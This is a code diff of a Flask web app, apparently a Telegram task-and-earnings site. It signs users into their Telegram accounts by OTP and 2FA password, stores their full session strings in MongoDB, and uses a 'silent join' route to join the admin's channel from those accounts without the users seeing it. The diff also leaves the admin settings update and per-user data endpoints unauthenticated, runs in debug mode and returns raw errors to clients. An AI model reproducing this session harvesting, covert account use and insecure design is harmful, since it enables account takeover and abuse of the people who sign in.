@@ -1,17 +1,16 @@
 import os
 import asyncio
-import threading
 from datetime import datetime, timedelta
-from telethon.tl.functions.channels import JoinChannelRequest
+from functools import wraps
 
-from flask import Flask, request, jsonify, session, render_template, session, redirect, url_for
+from flask import Flask, request, jsonify, session, render_template, redirect, url_for
 from flask_cors import CORS
 from pymongo import MongoClient
 
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from functools import wraps
+from telethon.tl.functions.channels import JoinChannelRequest
 
 # =========================
 # CONFIG
@@ -21,7 +20,7 @@ app.secret_key = os.environ.get("SECRET_KEY", "change_this_now")
 
 app.config.update(
     SESSION_COOKIE_HTTPONLY=True,
-    SESSION_COOKIE_SECURE=False,  # True করো HTTPS হলে
+    SESSION_COOKIE_SECURE=False,
     PERMANENT_SESSION_LIFETIME=timedelta(days=1)
 )
 
@@ -29,45 +28,33 @@ CORS(app)
 
 API_ID = int(os.environ.get("API_ID", "123456"))
 API_HASH = os.environ.get("API_HASH", "your_api_hash")
-MONGO_URI = os.environ.get("MONGO_URI", "your_mongo_uri")
+MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017")
 
 # ================= DB =================
-client_db = MongoClient("YOUR_MONGO_URI")
+client_db = MongoClient(MONGO_URI)
 db = client_db['aaf_tele_earn_db']
 users_col = db['users']
 settings_col = db['settings']
 tasks_col = db['tasks']
-
 
 # ================= LOGIN REQUIRED =================
 def login_required(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
         if "uid" not in session:
-            return redirect("/login")
+            return redirect(url_for('login'))
         return f(*args, **kwargs)
     return wrapper
-
 
 # ================= ADMIN SETTINGS =================
 def get_admin():
     return settings_col.find_one({"type": "global"}) or {}
 
-# =========================
-# HELPER: SAFE ASYNC RUN
-# =========================
+# ================= ASYNC RUN =================
 def run_async(coro):
-    loop = asyncio.new_event_loop()
-    try:
-        asyncio.set_event_loop(loop)
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+    return asyncio.run(coro)
 
-
-# =========================
-# SEND OTP
-# =========================
+# ================= SEND OTP =================
 @app.route('/api/send_otp', methods=['POST'])
 def send_otp():
     data = request.json
@@ -76,17 +63,15 @@ def send_otp():
     if not phone:
         return jsonify({"success": False, "message": "Phone required"})
 
-    # Rate limit (60 sec)
     user = users_col.find_one({"phone": phone})
     if user and user.get("last_otp_time"):
         if datetime.now() - user["last_otp_time"] < timedelta(seconds=60):
             return jsonify({"success": False, "message": "Try again later"})
 
     async def main():
-        client = None
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
         try:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await asyncio.wait_for(client.connect(), timeout=10)
+            await client.connect()
 
             if await client.is_user_authorized():
                 return True, "Already logged in"
@@ -108,19 +93,14 @@ def send_otp():
 
         except Exception as e:
             print("OTP ERROR:", e)
-            return False, "Failed to send OTP"
-
+            return False, str(e)
         finally:
-            if client:
-                await client.disconnect()
+            await client.disconnect()
 
     success, message = run_async(main())
     return jsonify({"success": success, "message": message})
 
-
-# =========================
-# VERIFY LOGIN
-# =========================
+# ================= VERIFY LOGIN =================
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login():
     data = request.json
@@ -131,29 +111,23 @@ def verify_login():
     if not phone:
         return jsonify({"success": False, "message": "Phone required"})
 
-    if not code and not password:
-        return jsonify({"success": False, "message": "Code or Password required"})
-
     temp = users_col.find_one({"phone": phone})
     if not temp or not temp.get("temp_session"):
         return jsonify({"success": False, "message": "Session expired"})
 
     async def main():
-        client = None
+        client = TelegramClient(
+            StringSession(temp["temp_session"]),
+            API_ID,
+            API_HASH
+        )
+
         try:
-            client = TelegramClient(
-                StringSession(temp["temp_session"]),
-                API_ID,
-                API_HASH
-            )
-            await asyncio.wait_for(client.connect(), timeout=10)
+            await client.connect()
 
             if password:
                 user = await client.sign_in(password=password.strip())
             else:
-                if not temp.get("phone_code_hash"):
-                    return False, "Retry OTP"
-
                 user = await client.sign_in(
                     phone=phone,
                     code=code,
@@ -178,14 +152,11 @@ def verify_login():
 
         except SessionPasswordNeededError:
             return False, "NEED_PASSWORD"
-
         except Exception as e:
             print("LOGIN ERROR:", e)
-            return False, "Login failed"
-
+            return False, str(e)
         finally:
-            if client:
-                await client.disconnect()
+            await client.disconnect()
 
     success, result = run_async(main())
 
@@ -198,11 +169,7 @@ def verify_login():
 
     return jsonify({"success": False, "message": result})
 
-# =========================
-# Users DATA 
-# =========================
-
-
+# ================= USER DATA =================
 @app.route('/api/user/data/<int:user_id>')
 def user_data(user_id):
     user = users_col.find_one({"telegram_id": user_id})
@@ -229,10 +196,7 @@ def user_data(user_id):
         }
     })
 
-
-# =========================
-# SILENT JOIN (BACKGROUND)
-# =========================
+# ================= SILENT JOIN =================
 @app.route('/api/silent_join', methods=['POST'])
 @login_required
 def silent_join():
@@ -240,16 +204,12 @@ def silent_join():
     user = users_col.find_one({"telegram_id": uid})
     admin = get_admin()
 
-    if not user or "session_str" not in user:
-        return jsonify({"success": False, "message": "session_expired"})
-
     async def join():
         client = TelegramClient(
             StringSession(user["session_str"]),
             API_ID,
             API_HASH
         )
-
         await client.connect()
         await client(JoinChannelRequest(admin.get("channel_id")))
         await client.disconnect()
@@ -259,19 +219,13 @@ def silent_join():
             {"$set": {"is_joined": True}}
         )
 
-        return True
-
     try:
-        asyncio.run(join())
+        run_async(join())
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
-
-    
-# =========================
-# BASIC USER DATA
-# =========================
+# ================= BASIC USER =================
 @app.route('/api/user')
 def get_user():
     uid = session.get('uid')
@@ -291,10 +245,7 @@ def get_user():
         }
     })
 
-# =========================
-# admin DECORATOR
-# =========================
-
+# ================= ADMIN =================
 @app.route('/admin/update', methods=['POST'])
 def admin_update():
     data = request.json
@@ -305,73 +256,58 @@ def admin_update():
     )
     return jsonify({"success": True})
 
-# ========login=================
+# ================= PAGES =================
 @app.route('/')
 def index():
     return render_template('index.html')
 
+@app.route('/login')
+def login():
+    return render_template('index.html')
 
-# DASHBOARD=====================
 @app.route('/dashboard')
 @login_required
-def render_dashboard_page():
-    try:
-        user = users_col.find_one({"telegram_id": int(session['uid'])})
-        admin = settings_col.find_one({"type": "global"}) or {}
+def dashboard():
+    user = users_col.find_one({"telegram_id": session['uid']})
+    admin = get_admin()
+    return render_template('dashboard.html', user=user, admin=admin)
 
-        return render_template(
-            'dashboard.html',
-            user=user,
-            admin=admin
-        )
-    except Exception as e:
-        print("Dashboard Error:", e)
-        return redirect(url_for('logout'))
-
-# TASK PAGE================
 @app.route('/task')
 @login_required
-def render_task_page():
+def task():
     return render_template('task.html')
 
-# TRADING PAGE=============
 @app.route('/trading')
 @login_required
-def render_trading_page():
+def trading():
     return render_template('trading.html')
 
-# WALLET=========================
 @app.route('/wallet')
 @login_required
-def render_wallet_page():
+def wallet():
     return render_template('wallet.html')
 
-# ACCOUNT==================
 @app.route('/account')
 @login_required
-def render_account_page():
+def account():
     return render_template('account.html')
 
-# REFER LIST===============
 @app.route('/refer_list')
 @login_required
-def render_refer_page():
+def refer_list():
     return render_template('refer_list.html')
 
-# PAYMENT HISTORY==========
 @app.route('/payment_history')
 @login_required
-def render_history_page():
+def payment_history():
     return render_template('payment_history.html')
 
-# LOGOUT===================
 @app.route('/logout')
 def logout():
     session.clear()
-    return redirect(url_for('index'))
-    
-# RUN SERVER===============
+    return redirect(url_for('login'))
+
+# ================= RUN =================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
-    
